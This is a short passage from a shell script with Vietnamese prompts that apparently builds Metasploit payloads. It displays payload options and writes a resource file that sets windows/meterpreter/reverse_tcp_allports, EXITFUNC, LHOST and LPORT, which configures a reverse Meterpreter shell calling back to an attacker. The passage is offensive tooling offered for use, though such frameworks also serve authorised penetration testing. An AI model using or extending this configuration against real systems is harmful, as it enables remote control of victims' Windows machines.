...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp_allports):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_tcp_allports" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="windows/meterpreter/reverse_tcp_allports"
	lhost=$lhost
	lport=$lport
}
